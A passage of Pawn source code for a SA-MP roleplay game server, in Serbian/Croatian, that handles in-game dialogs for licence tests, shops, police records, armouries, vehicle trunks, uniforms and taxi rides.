			        format( globalstring, sizeof( globalstring ), ""col_white"Uspesno ste polozili testove sa "col_crvena"%d "col_white"bodova.\nDobili ste dozvolu za kamion sa prikolicom.", PolaganjeBodovi[ playerid ] );
					SPD( playerid, dialog_C3_ISPIT , DSMSG, ""col_white"Cestitamo !", globalstring, "Uredu", "");
					PolaganjeBodovi[ playerid ]  = 0; PlayerInfo[ playerid ][ xKamionskaC3 ] = 1; SavePlayer( playerid );
				}
				else if(PolaganjeBodovi[ playerid ]  < 7)
				{
					SPD( playerid, dialog_C3_ISPIT , DSMSG, ""col_white"Zao nam je", "Nemate dovoljno za prolazak testova.", "Uredu", "");
					PolaganjeBodovi[ playerid ]  = 0;
					DeletePVar( playerid, "dialog_C3_POLAGANJE");
				}
		    }
		    else if( !response )
		    {
		        PolaganjeBodovi[ playerid ] ++;
				if(PolaganjeBodovi[ playerid ]  >= 7)
				{
					DeletePVar( playerid, "dialog_C3_POLAGANJE");
			        format( globalstring, sizeof( globalstring ), ""col_white"Uspesno ste polozili testove sa "col_crvena"%d "col_white"bodova.\nDobili ste dozvolu za kamion sa prikolicom.", PolaganjeBodovi[ playerid ] );
					SPD( playerid, dialog_C3_ISPIT , DSMSG, ""col_white"Cestitamo !", globalstring, "Uredu", "");
					PolaganjeBodovi[ playerid ]  = 0; PlayerInfo[ playerid ][ xKamionskaC3 ] = 1; SavePlayer( playerid );
				}
				else if(PolaganjeBodovi[ playerid ]  < 7)
				{
					SPD( playerid, dialog_C3_ISPIT , DSMSG, ""col_white"Zao nam je", "Nemate dovoljno za prolazak testova.", "Uredu", "");
					PolaganjeBodovi[ playerid ]  = 0;
					DeletePVar( playerid, "dialog_C3_POLAGANJE");
				}
		    }
		}
	}
	else if( dialogid == dialog_PHARMACY )
	{
	    if(response == 1)
        {
            switch( listitem )
            {
                case 0:
                {
                    if( PlayerInfo[ playerid ][ xNovac ] < 50 ) return SendErrorMessage( playerid, "Nemate dovoljno novca(50 $)." );
                    SCM( playerid, BELA, "Kupili ste bocicu solne kiseline.");
                    DajIgracuNovac( playerid, -50 );
                    PlayerInfo[ playerid ][ xSolna ] += 10;
                    PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
                }
                case 1:
                {
                    if( PlayerInfo[ playerid ][ xNovac ] < 85 ) return SendErrorMessage( playerid, "Nemate dovoljno novca(85 $)." );
                    SCM( playerid, BELA, "Kupili ste 5 pseudo tableta.");
                    PlayerInfo[ playerid ][ xPseudo ] += 5;
                    DajIgracuNovac( playerid, -85 );
                    PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
                }
                case 2:
                {
                    if( PlayerInfo[ playerid ][ xNovac ] < 65 ) return SendErrorMessage( playerid, "Nemate dovoljno novca(65 $)." );
                    SCM( playerid, BELA, "Kupili ste galon crvenog fosfora.");
                    PlayerInfo[ playerid ][ xCrveniF ] += 10;
                    DajIgracuNovac( playerid, -65 );
                    PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
                }
                case 3:
                {
                    if( PlayerInfo[ playerid ][ xNovac ] < 35 ) return SendErrorMessage( playerid, "Nemate dovoljno novca(35 $)." );
                    SCM( playerid, BELA, "Kupili ste bocicu Lysergic acida.");
                    PlayerInfo[ playerid ][ xLysAcid ] += 5;
                    DajIgracuNovac( playerid, -35 );
                    PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
                }
                case 4:
                {
                    if( PlayerInfo[ playerid ][ xNovac ] < 25 ) return SendErrorMessage( playerid, "Nemate dovoljno novca(25 $)." );
                    SCM( playerid, BELA, "Kupili ste 10 tableta kalcijuma.");
                    PlayerInfo[ playerid ][ xKalcij ] += 10;
                    DajIgracuNovac( playerid, -25 );
                    PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
                }
                case 5:
                {
                    if( PlayerInfo[ playerid ][ xNovac ] < 45 ) return SendErrorMessage( playerid, "Nemate dovoljno novca(45 $)." );
                    SCM( playerid, BELA, "Kupili ste bocicu Amonijum Hlorida.");
                    PlayerInfo[ playerid ][ xAmonijH ] += 10;
                    DajIgracuNovac( playerid, -45 );
                    PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
                }
			}
		}
	}
	else if( dialogid == dialog_ORMAR ) {
	    if( response == 1 ) {
            switch( listitem ) {
                case 0: {
                    if( II[ inProperty[ playerid ] ][ iSkin ][ 0 ] == 0 )
                    {
                        SCM( playerid, BELA, "Spremili ste trenutnu odecu u ormar!");
	                    II[ inProperty[ playerid ] ][ iSkin ][ 0 ] = GetPlayerSkin( playerid );
	                    PostaviSkin( playerid, 154 ); PlayerInfo[ playerid ][ xSkin ] = 154; SaveProperty( inProperty[ playerid ] );
             			
					}
					else if( II[ inProperty[ playerid ] ][ iSkin ][ 1 ] == 0 )
                    {
                        SCM( playerid, BELA, "Spremili ste trenutnu odecu u ormar!");
	                    II[ inProperty[ playerid ] ][ iSkin ][ 1 ] = GetPlayerSkin( playerid );
	                    PostaviSkin( playerid, 154 ); PlayerInfo[ playerid ][ xSkin ] = 154; SaveProperty( inProperty[ playerid ] );
	                   	
					}
					else if( II[ inProperty[ playerid ] ][ iSkin ][ 2 ] == 0 )
                    {
                        SCM( playerid, BELA, "Spremili ste trenutnu odecu u ormar!");
	                    II[ inProperty[ playerid ] ][ iSkin ][ 2 ] = GetPlayerSkin( playerid );
	                    PostaviSkin( playerid, 154 ); PlayerInfo[ playerid ][ xSkin ] = 154; SaveProperty( inProperty[ playerid ] );
                        
					}
					else return SendErrorMessage( playerid, "Nemate mesta za vise odece u ormaru." );
                }
                case 1: {
			    	Novi_SetPlayerPos( playerid, 258.4893,-41.4008,1002.0234 );
					SetPlayerInterior( playerid, 14 );
					SetPlayerFacingAngle( playerid, 270.0 );
					SetPlayerCameraPos( playerid, 256.0815, -43.0475, 1004.0234 );
					SetPlayerCameraLookAt( playerid, 258.4893, -41.4008, 1002.0234 );
     				TogglePlayerControllable( playerid, false );
					ApplyAnimation( playerid, "CLOTHES","CLO_Pose_Legs",4.1,1,0,0,0,0, 1);
					OrmarTDControl( playerid, true );
					PlayerTextDrawSetPreviewModel( playerid, Ormar[ playerid ][ 3 ], II[ inProperty[ playerid ] ][ iSkin ][ 0 ] );
					PlayerTextDrawSetPreviewModel( playerid, Ormar[ playerid ][ 4 ], II[ inProperty[ playerid ] ][ iSkin ][ 1 ] );
					PlayerTextDrawSetPreviewModel( playerid, Ormar[ playerid ][ 5 ], II[ inProperty[ playerid ] ][ iSkin ][ 2 ] );

                    for( new i = 0; i < 10; i++) {
						PlayerTextDrawShow( playerid, Ormar[ playerid ][ i ] );
					}
					SelectTextDraw( playerid, 0x5D9FCEFF );
				}
			}
		}
	}
	else if( dialogid == dialog_BUY_MOBILEPHONE ) {
		new string[ 128 ];
        if( response == 1 ) {
            switch( listitem )  {
                case 0: {
                    if( PlayerInfo[ playerid ][ xNovac ] < 6985 ) return SendErrorMessage( playerid, "Nemate dovoljno novca." );
					DajIgracuNovac( playerid, -6985 );
					BussinesMoney( uFirmi[ playerid ], 200 );
					PlayerInfo[ playerid ][ xModelTelefona ] = 18865;
                	SCM( playerid, BELA, "Uspesno ste kupili Samsung Galaxy S5!");
                	PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
					new randphone = 100000 + random(899999);
					PlayerInfo[ playerid ][ xBrojTelefona ] = randphone;
					format(string, sizeof(string), "Vas novi broj mobilnog telefona je %d", randphone);
					SCM( playerid, BELA, string);
                }
				case 1: {
                    if( PlayerInfo[ playerid ][ xNovac ] < 5351 ) return SendErrorMessage( playerid, "Nemate dovoljno novca." );
					DajIgracuNovac( playerid, -5351);
					BussinesMoney( uFirmi[ playerid ], 150 );
					PlayerInfo[ playerid ][ xModelTelefona ] = 18866;
                	SCM( playerid, BELA, "Uspesno ste kupili Nokia Lumia 930!");
                	PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
					new randphone = 100000 + random(899999);
					PlayerInfo[ playerid ][ xBrojTelefona ] = randphone;
					format(string, sizeof(string), "Vas novi broj mobilnog telefona je %d", randphone);
					SCM( playerid, BELA, string);
     			}
     			case 2: {
                    if( PlayerInfo[ playerid ][ xNovac ] < 6101 ) return SendErrorMessage( playerid, "Nemate dovoljno novca." );
					DajIgracuNovac( playerid, -6101);
					BussinesMoney( uFirmi[ playerid ], 160 );
					PlayerInfo[ playerid ][ xModelTelefona ] = 18867;
                	SCM( playerid, BELA, "Uspesno ste kupili Sony Xperia Z3!");
                	PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
					new randphone = 100000 + random(899999);
					PlayerInfo[ playerid ][ xBrojTelefona ] = randphone;
					format(string, sizeof(string), "Vas novi broj mobilnog telefona je %d", randphone);
					SCM( playerid, BELA, string);
     			}
     			case 3: {
				    if( PlayerInfo[ playerid ][ xNovac ] < 4568 ) return SendErrorMessage( playerid, "Nemate dovoljno novca." );
					DajIgracuNovac( playerid, -4568);
					BussinesMoney( uFirmi[ playerid ], 120 );
					PlayerInfo[ playerid ][ xModelTelefona ] = 18868;
                	SCM( playerid, BELA, "Uspesno ste kupili Apple iPhone 6!");
                	PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
					new randphone = 100000 + random(899999);
					PlayerInfo[ playerid ][ xBrojTelefona ] = randphone;
					format(string, sizeof(string), "Vas novi broj mobilnog telefona je %d", randphone);
					SCM( playerid, BELA, string);
     			}
     			case 4: {
				    if( PlayerInfo[ playerid ][ xNovac ] < 3657 ) return SendErrorMessage( playerid, "Nemate dovoljno novca." );
					DajIgracuNovac( playerid, -3657);
					BussinesMoney( uFirmi[ playerid ], 120 );
					PlayerInfo[ playerid ][ xModelTelefona ] = 18869;
                	SCM( playerid, BELA, "Uspesno ste kupili LG Nexus 5!");
                	PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
					new randphone = 100000 + random(899999);
					PlayerInfo[ playerid ][ xBrojTelefona ] = randphone;
					format(string, sizeof(string), "Vas novi broj mobilnog telefona je %d", randphone);
					SCM( playerid, BELA, string);
     			}
     			case 5: {
				    if( PlayerInfo[ playerid ][ xNovac ] < 2657 ) return SendErrorMessage( playerid, "Nemate dovoljno novca." );
					DajIgracuNovac( playerid, -2657);
					BussinesMoney( uFirmi[ playerid ], 110 );
					PlayerInfo[ playerid ][ xModelTelefona ] = 18870;
                	SCM( playerid, BELA, "Uspesno ste kupili HTC Desire!");
                	PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
					new randphone = 100000 + random(899999);
					PlayerInfo[ playerid ][ xBrojTelefona ] = randphone;
					format(string, sizeof(string), "Vas novi broj mobilnog telefona je %d", randphone);
					SCM( playerid, BELA, string);
     			}
     			case 6: {
				    if( PlayerInfo[ playerid ][ xNovac ] < 1245 ) return SendErrorMessage( playerid, "Nemate dovoljno novca." );
					DajIgracuNovac( playerid, -1245);
					BussinesMoney( uFirmi[ playerid ], 100 );
					PlayerInfo[ playerid ][ xModelTelefona ] = 18871;
                	SCM( playerid, BELA, "Uspesno ste kupili Huawei Ascend Mate!");
                	PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
					new randphone = 100000 + random(899999);
					PlayerInfo[ playerid ][ xBrojTelefona ] = randphone;
					format(string, sizeof(string), "Vas novi broj mobilnog telefona je %d", randphone);
					SCM( playerid, BELA, string);
     			}
     			case 7: {
				    if( PlayerInfo[ playerid ][ xNovac ] < 1278 ) return SendErrorMessage( playerid, "Nemate dovoljno novca." );
					DajIgracuNovac( playerid, -1278);
					BussinesMoney( uFirmi[ playerid ], 100 );
					PlayerInfo[ playerid ][ xModelTelefona ] = 18872;
                	SCM( playerid, BELA, "Uspesno ste kupili Alcatel One Touch!");
                	PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
					new randphone = 100000 + random(899999);
					PlayerInfo[ playerid ][ xBrojTelefona ] = randphone;
					format(string, sizeof(string), "Vas novi broj mobilnog telefona je %d", randphone);
					SCM( playerid, BELA, string);
     			}
     			case 8: {
				    if( PlayerInfo[ playerid ][ xNovac ] < 5975 ) return SendErrorMessage( playerid, "Nemate dovoljno novca." );
					DajIgracuNovac( playerid, -5975);
					BussinesMoney( uFirmi[ playerid ], 135 );
					PlayerInfo[ playerid ][ xModelTelefona ] = 18873;
                	SCM( playerid, BELA, "Uspesno ste kupili Motorola Nexus 6!");
                	PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
					new randphone = 100000 + random(899999);
					PlayerInfo[ playerid ][ xBrojTelefona ] = randphone;
					format(string, sizeof(string), "Vas novi broj mobilnog telefona je %d", randphone);
					SCM( playerid, BELA, string);
     			}
     			case 9: {
				    if( PlayerInfo[ playerid ][ xNovac ] < 3422 ) return SendErrorMessage( playerid, "Nemate dovoljno novca." );
					DajIgracuNovac( playerid, -3422);
					BussinesMoney( uFirmi[ playerid ], 123 );
					PlayerInfo[ playerid ][ xModelTelefona ] = 18874;
                	SCM( playerid, BELA, "Uspesno ste kupili Blackberry Z30 LTE!");
                	PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
					new randphone = 100000 + random(899999);
					PlayerInfo[ playerid ][ xBrojTelefona ] = randphone;
					format(string, sizeof(string), "Vas novi broj mobilnog telefona je %d", randphone);
					SCM( playerid, BELA, string);
     			}
            }
		}
    }
    else if( dialogid == dialog_SEARCH_NAME && response && strlen( inputtext ) ) {

		if( GetPlayerIdFromName( inputtext ) == INVALID_PLAYER_ID ) {
			SCM( playerid, CRVENA, "Pogresno ime gradjanina.");
			return 1;
		}
		new SexTxt[ 7 ], ID = GetPlayerIdFromName( inputtext );

        if( PlayerInfo[ ID ][ xPol ] == 2 ) format( SexTxt, sizeof( SexTxt ), "Zensko" );
		else format( SexTxt, sizeof( SexTxt ), "Musko" );
        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
		format( DialogStrgEx, sizeof( DialogStrgEx ), "Ime i prezime: %s\nPol: %s\nGodine: %d\n\nPosao: %s\nBroj mobilnog: %d\n\nZlocin : %s\nPrijavio : %s",
		ImeIgraca( ID ), SexTxt, PlayerInfo[ ID ][ xGodine ], getJobName( PlayerInfo[ ID ][ xPosao ] ), PlayerInfo[ ID ][ xBrojTelefona ], ZlocinInfo[ ID ][ zZlocin ], ZlocinInfo[ ID ][ zPrijavio ] );

		SPD( playerid, 0, DSMSG, D_NASLOV, DialogStrgEx, "U redu", "" );
		strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
		return true;
	}
	else if( dialogid == dialog_SEARCH_NUMBERPLATE && response && strlen( inputtext ) ) {

		new string[64];
	            
		if( getVehicleScriptID( strval( inputtext ) ) == -1 ) return SendErrorMessage( playerid, "Krivi unos." );
		
		new autoid = getVehicleScriptID( strval( inputtext ) );
		
		format( string, sizeof( string ), V_FILE, autoid );
    	if( !fexist( string ) ) return SendErrorMessage( playerid, "Krivi unos." );
        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
		format( DialogStrgEx, sizeof( DialogStrgEx ), "Model: %s\nRegistracija: 'LS - %d'\nVlasnik: %s", ImeVozila[ VehicleInfo[ autoid ][ vModel ]-400 ], VehicleInfo[ autoid ][ vID ], VehicleInfo[ autoid ][ vOwner ] );
		SPD( playerid, 0, DSMSG, D_NASLOV, DialogStrgEx, "U redu", "" );
		strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));

		return true;
	}
	else if( dialogid == dialog_POSTAVIPOTERU && response && strlen( inputtext ) ) {
		new lala[ 32 ], tekst[ 64 ];
		if( sscanf( inputtext,"s[32]s[64]", lala, tekst ) ) return SendErrorMessage( playerid, "Krivi unos." );
        if( GetPlayerIdFromName( lala ) == INVALID_PLAYER_ID ) {
			SCM( playerid, CRVENA, "Pogresno ime gradjanina.");
			return 1;
		}
		new id = GetPlayerIdFromName( lala );
		PostaviWanted( id, tekst, ImeIgraca( playerid ) );
		return true;
	}
	else if( dialogid == dialog_OCISTIDOSIJE && response && strlen( inputtext ) ) {

		if( GetPlayerIdFromName( inputtext ) == INVALID_PLAYER_ID)
  		{
			SCM( playerid, CRVENA, "Pogresno ime gradjanina.");
			return 1;
		}

		new ID = GetPlayerIdFromName( inputtext );
		PlayerInfo[ ID ][ xWanted ] = 0;
	    Novi_SetPlayerWantedLevel( ID, PlayerInfo[ ID ][ xWanted ] );
	    strmid( ZlocinInfo[ ID ][zPrijavio], "Nema", 0, strlen("Nema"), 255);
		strmid( ZlocinInfo[ ID ][zPocinio], "Nema", 0, strlen("Nema"), 255);
		strmid( ZlocinInfo[ ID ][zZlocin], "Nema", 0, strlen("Nema"), 255);
	    SendClientMessageEx( playerid, BELA, "Obrisali ste dosije gradjaninu %s.", ImeIgraca( ID ) );
	    
	    format( globalstring, sizeof( globalstring ), "| CLEARWL | %s je ocistio WL igracu %s.", ImeIgraca( playerid ), ImeIgraca( ID ) );
		AdminPoruka( SVETLOCRVENA, globalstring );
		
		format( globalstring, sizeof globalstring, "| CLEARWL | %s je ocistio WL igracu %s.", ImeIgraca( playerid ), ImeIgraca( ID ) );
		OrgPorukaLeader( PlayerInfo[ playerid ][ xClan ], 0xD2CFCFFF, globalstring );
		return true;
	}
	else if( dialogid == dialog_OPREMA ) {
	    if( response ) { 
		    switch( listitem ) {
				case 0: {
				    ResetAllWeapons( playerid );
				    GiveWeaponToPlayer( playerid, 3, 1 );
					GiveWeaponToPlayer( playerid, 41, 500 );
					GiveWeaponToPlayer( playerid, 24, 75 );
					PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
  					
					format( globalstring, sizeof( globalstring ), "* %s je upravo uzeo patrolnu opremu.", ImeIgraca( playerid ) );
					PorukaRadius(30.0, playerid, globalstring, LJUBICASTA );
				}
				case 1: {
					ResetAllWeapons( playerid );
					GiveWeaponToPlayer( playerid, 3, 1 );
					GiveWeaponToPlayer( playerid, 24, 75 );
					GiveWeaponToPlayer( playerid, 25, 100 );
					PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
					
					format( globalstring, sizeof( globalstring ), "* %s je upravo uzeo standardnu opremu.", ImeIgraca( playerid ) );
					PorukaRadius( 30.0, playerid, globalstring, LJUBICASTA );
				}
				case 2: {
				    if( PlayerInfo[ playerid ][ xRank ] >= 2 ) {
						ResetAllWeapons( playerid );
						GiveWeaponToPlayer( playerid, 3, 1 );
						GiveWeaponToPlayer( playerid, 24, 75 );
						GiveWeaponToPlayer( playerid, 25, 100 );
						GiveWeaponToPlayer( playerid, 29, 200 );
						PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
					 	
						format( globalstring, sizeof( globalstring ), "* %s je upravo uzeo specijalnu opremu.", ImeIgraca( playerid ) );
						PorukaRadius(30.0, playerid, globalstring, LJUBICASTA );
					} else return SendErrorMessage( playerid, "Nemate dovoljni rank(2+)." );

				} 
				case 3: { 
				    if( PlayerInfo[ playerid ][ xRank ] >= 2 ) {
						ResetAllWeapons( playerid );
						GiveWeaponToPlayer( playerid, 24, 75 );
						GiveWeaponToPlayer( playerid, 29, 200 );
						GiveWeaponToPlayer( playerid, 31, 300 );
						PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
						
						format( globalstring, sizeof( globalstring ), "* %s je upravo uzeo profesionalnu opremu.", ImeIgraca( playerid ) );
						PorukaRadius(30.0, playerid, globalstring, LJUBICASTA );
					} else return SendErrorMessage( playerid, "Nemate dovoljni rank(2+)." );
				}
				case 4: {
				    if( PlayerInfo[ playerid ][ xRank ] >= 4 ) {
				    	ResetAllWeapons( playerid );
						GiveWeaponToPlayer( playerid, 24, 75 );
						GiveWeaponToPlayer( playerid, 34, 50 );
						PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
 						
						format( globalstring, sizeof( globalstring ), "* %s je upravo uzeo snajpersku opremu.", ImeIgraca( playerid ) );
						PorukaRadius(30.0, playerid, globalstring, LJUBICASTA );
					} else return SendErrorMessage( playerid, "Nemate dovoljni rank(4+)." );
				}
				case 5: {
					Novi_SetPlayerArmour( playerid, 100 );
					format( globalstring, sizeof( globalstring ), "* %s je upravo uzeo nesto iz ormara.", ImeIgraca( playerid ) );
					PorukaRadius(30.0, playerid, globalstring, LJUBICASTA );
				}
				case 6: {
					Novi_SetPlayerHealth( playerid, 150 );
					format( globalstring, sizeof( globalstring ), "* %s je upravo uzeo nesto iz ormara.", ImeIgraca( playerid ) );
					PorukaRadius(30.0, playerid, globalstring, LJUBICASTA );
				}
				case 7: {
					if( IsPlayerAttachedObjectSlotUsed( playerid, OBJECT_SLOT_LHAND ) ) {
	                	SCM( playerid, CRVENA, "Vec imas neki objekt u lijevoj ruci!");
	                    return 1;
					}
	                RiotShield[ playerid ] = true;
					SetPlayerAttachedObject( playerid, OBJECT_SLOT_LHAND, 18637, 3, 0.297411, -0.252804, -0.022625, 0.626678, 1.138009, 82.256072, 1, 1, 1);
					SendInfoMessage( playerid, "Uzeli ste Riot Shield iz Armoury-a.");
					format( globalstring, sizeof( globalstring ), "* %s je uzeo Riot Shield iz Armoury-a.", ImeIgraca( playerid ) );
					PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
	            }
				case 8: {
				    if( PlayerInfo[ playerid ][ xRank ] >= 2 ) {
						PostaviSkin( playerid, 285 );
 						
						Novi_SetPlayerHealth( playerid, 150 );
						Novi_SetPlayerArmour( playerid, 150 );
						format( globalstring, sizeof( globalstring ), "* %s je upravo obukao swat opremu.", ImeIgraca( playerid ) );
						PorukaRadius(30.0, playerid, globalstring, LJUBICASTA );
                    } else return SendErrorMessage( playerid, "Nemate dovoljni rank(2+)." );
				}
				case 9: {
					BrojLisica[ playerid ] = 3;
					SendInfoMessage( playerid, "Uzeli ste 3 para lisica iz ormara.");
				    format( globalstring, sizeof( globalstring ), "* %s je upravo uzeo nesto iz ormara.", ImeIgraca( playerid ) );
					PorukaRadius(30.0, playerid, globalstring, LJUBICASTA );
				}
				case 10: {
					TazerMetkovi[ playerid ] = 30;
					SendInfoMessage( playerid, "Uzeli ste 30 metkova tazera iz ormara.");
				    format( globalstring, sizeof( globalstring ), "* %s je upravo uzeo nesto iz ormara.", ImeIgraca( playerid ) );
					PorukaRadius(30.0, playerid, globalstring, LJUBICASTA );
				}
                case 11: {
                    GiveWeaponToPlayer(playerid, WEAPON_CAMERA, 30);
                    SendInfoMessage( playerid, "Uzeli ste fotoaparat iz ormara.");
                    format( globalstring, sizeof( globalstring ), "* %s je upravo uzeo nesto iz ormara.", ImeIgraca( playerid ) );
                    PorukaRadius(30.0, playerid, globalstring, LJUBICASTA );
                }
			}
		}
	}
	else if( dialogid == dialog_VEHICLEWEPTAKE ) {
	    new wepname[ 32 ];
	    if( response == 1 )  {
	        switch( listitem ) {
	            case 0: {
	                if( VehicleInfo[ TrunkVehicle[ playerid ] ][ vWeap1 ] == 0) {
	                    SendErrorMessage( playerid, "Nemate oruzja u tom slotu.");
	                    return 1;
	                }

	                format( wepname, sizeof( wepname ), "%s", WeapNames[ VehicleInfo[ TrunkVehicle[ playerid ] ][ vWeap1 ] ] );
                    antiCheatCS[ playerid ][ WeaponDetect ] = 3;
	                GiveWeaponToPlayer( playerid, VehicleInfo[ TrunkVehicle[ playerid ] ][ vWeap1 ], VehicleInfo[ TrunkVehicle[ playerid ] ][ vAmmo1 ] );
	                VehicleInfo[ TrunkVehicle[ playerid ] ][ vWeap1 ] = 0;
	                VehicleInfo[ TrunkVehicle[ playerid ] ][ vAmmo1 ] = 0;
	                SaveVehicle( TrunkVehicle[ playerid ] );

					format( globalstring, sizeof( globalstring ), "* %s vadi %s iz prtljaznika.", ImeIgraca( playerid ), wepname );
					PorukaRadius(5, playerid, globalstring, LJUBICASTA );
	            }
	            case 1: {
           	 		if( VehicleInfo[TrunkVehicle[ playerid ] ][ vWeap2 ] == 0) {
						SendErrorMessage( playerid, "Nemate oruzja u tom slotu.");
	                    return 1;
	                }

	                format( wepname, sizeof( wepname ), "%s", WeapNames[ VehicleInfo[ TrunkVehicle[ playerid ] ][ vWeap2 ] ] );
                    antiCheatCS[ playerid ][ WeaponDetect ] = 3;
	                GiveWeaponToPlayer( playerid, VehicleInfo[ TrunkVehicle[ playerid ] ][ vWeap2 ], VehicleInfo[ TrunkVehicle[ playerid ] ][ vAmmo2 ] );
	                VehicleInfo[ TrunkVehicle[ playerid ] ][ vWeap2 ] = 0;
	                VehicleInfo[ TrunkVehicle[ playerid ] ][ vAmmo2 ] = 0;
	                SaveVehicle( TrunkVehicle[ playerid ] );

					format( globalstring, sizeof( globalstring ), "* %s vadi %s iz prtljaznika.", ImeIgraca( playerid ), wepname );
					PorukaRadius(5, playerid, globalstring, LJUBICASTA );
	            }
	            case 2: {
           	 		if( VehicleInfo[TrunkVehicle[ playerid ]][vMelee] == 0) {
						SendErrorMessage( playerid, "Nemate oruzja u tom slotu.");
	                    return 1;
	                }

	                format( wepname, sizeof( wepname ), "%s", WeapNames[ VehicleInfo[ TrunkVehicle[ playerid ] ][ vMelee ] ] );
                    antiCheatCS[ playerid ][ WeaponDetect ] = 3;
	                GiveWeaponToPlayer(playerid, VehicleInfo[ TrunkVehicle[ playerid ] ][ vMelee ], 1 );
	                VehicleInfo[ TrunkVehicle[ playerid ] ][ vMelee ] = 0;
	                SaveVehicle( TrunkVehicle[ playerid ] );

	               	format( globalstring, sizeof( globalstring ), "* %s vadi %s iz prtljaznika.", ImeIgraca( playerid ), wepname );
					PorukaRadius(5, playerid, globalstring, LJUBICASTA );
				}
	        }
		}
	}
	else if( dialogid == dialog_MUNIFORM)
    {
        if(response == 1)
        {
            switch( listitem )
            {
                case 0:
                {
                    PlayerPlaySound( playerid, 1057, 0.0, 0.0, 0.0);
		           	SendInfoMessage( playerid, "Obukli ste svoju radnu uniformu i spremni za posao.");
		            format( globalstring, sizeof( globalstring ), "* %s oblaci svoju radnu uniformu i priprema se za posao.", ImeIgraca( playerid ) );
		   			PorukaRadius( 10.0, playerid, globalstring, LJUBICASTA );
		   			PostaviSkin( playerid, 70 );
					
				}
                case 1:
                {
			        PlayerPlaySound( playerid, 1057, 0.0, 0.0, 0.0);
		           	SendInfoMessage( playerid, "Obukli ste svoju radnu uniformu i spremni za posao.");
		            format( globalstring, sizeof( globalstring ), "* %s oblaci svoju radnu uniformu i priprema se za posao.", ImeIgraca( playerid ) );
		   			PorukaRadius( 10.0, playerid, globalstring, LJUBICASTA );
		   			PostaviSkin( playerid, 274 );
					
                }
                case 2:
                {
                    PlayerPlaySound( playerid, 1057, 0.0, 0.0, 0.0);
		           	SendInfoMessage( playerid, "Obukli ste svoju radnu uniformu i spremni za posao.");
		            format( globalstring, sizeof( globalstring ), "* %s oblaci svoju radnu uniformu i priprema se za posao.", ImeIgraca( playerid ) );
		   			PorukaRadius( 10.0, playerid, globalstring, LJUBICASTA );
		   			PostaviSkin( playerid, 275 );
					
				}
				case 3:
                {
                    PlayerPlaySound( playerid, 1057, 0.0, 0.0, 0.0);
		           	SendInfoMessage( playerid, "Obukli ste svoju radnu uniformu i spremni za posao.");
		            format( globalstring, sizeof( globalstring ), "* %s oblaci svoju radnu uniformu i priprema se za posao.", ImeIgraca( playerid ) );
			 		PorukaRadius( 10.0, playerid, globalstring, LJUBICASTA );
		   			PostaviSkin( playerid, 276 );
 					
				}
            }
		}
    }
    else if( dialogid == dialog_TAXIOFFER ) {
		if( response ) {
			new string[39];

			TaximetarUkljucen[ offeredByCabbie[ playerid ] ] = true;
			CenaVoznje[ offeredByCabbie[ playerid ] ] = 1;
			VoziIgracaID[ offeredByCabbie[ playerid ] ] = playerid;

			PlayerTextDrawShow( playerid, TaxistaTD[ playerid ][ 0 ] );
			PlayerTextDrawShow( playerid, TaxistaTD[ playerid ][ 1 ] );
			PlayerTextDrawShow( playerid, TaxistaTD[ playerid ][ 2 ] );
			PlayerTextDrawShow( playerid, TaxistaTD[ playerid ][ 3 ] );
			PlayerTextDrawShow( playerid, TaxistaTD[ playerid ][ 4 ] );
			PlayerTextDrawShow( playerid, TaxistaTD[ playerid ][ 5 ] );
			PlayerTextDrawShow( playerid, TaxistaTD[ playerid ][ 7 ] );

			format( string, sizeof( string ), "%s", GetPlayerLocation( playerid ) );
			PlayerTextDrawSetString( offeredByCabbie[ playerid ], TaxistaTD[ offeredByCabbie[ playerid ] ][ 7 ], string );

			format( string, sizeof( string ), "%s", GetPlayerLocation( playerid ) );
			PlayerTextDrawSetString( playerid, TaxistaTD[ playerid ][ 7 ], string );

			format( string, sizeof( string ), "%d$", CenaVoznje[ offeredByCabbie[ playerid ] ] );
			PlayerTextDrawSetString( offeredByCabbie[ offeredByCabbie[ playerid ] ], TaxistaTD[ offeredByCabbie[ playerid ] ][ 6 ], string );

			format( string, sizeof( string ), "%d$", CenaVoznje[ offeredByCabbie[ playerid ] ] );
			PlayerTextDrawSetString( playerid, TaxistaTD[ playerid ][ 6 ], string );

			PlayerTextDrawShow( playerid, TaxistaTD[ playerid ][ 6 ] );
			PlayerTextDrawShow( offeredByCabbie[ playerid ], TaxistaTD[ offeredByCabbie[ playerid ] ][ 6 ] );
			PlayerTextDrawShow( playerid, TaxistaTD[ playerid ][ 7 ] );
			PlayerTextDrawShow( offeredByCabbie[ playerid ], TaxistaTD[ offeredByCabbie[ playerid ] ][ 7 ] );

			SCM( offeredByCabbie[ playerid ], ZUTA, "Klijent je prihvatio voznju!");
			SCM( playerid, ZUTA, "Ukoliko taxista abjusa te ne zeli stati kucajte /stoptaxi te slikajte i prijaviti na forum.");
            SCM( playerid, ZUTA, "U suprutnom ne kucajte vec samo izadjite na lokaciji gdje vas odveze inace cete biti kaznjeni!");

			TaxiTimer[ offeredByCabbie[ playerid ] ] = SetTimerEx( "Taxitimer", 6000, true, "i", offeredByCabbie[ playerid ] );
		}
		else
		{
